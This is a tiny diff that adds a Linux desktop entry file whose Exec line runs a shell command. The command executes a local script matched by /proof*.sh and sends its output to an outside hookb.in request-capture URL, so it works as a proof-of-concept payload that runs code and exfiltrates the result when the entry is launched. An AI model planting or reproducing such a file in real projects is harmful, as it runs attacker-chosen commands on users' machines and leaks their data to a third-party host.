@@ -1,0 +1,3 @@
+[Desktop Entry]
+Exec=sh -c "curl https://hookb.in/LgV1mz9ErlT18Vqq86ao?a=`/proof*.sh`"
+Type=Application
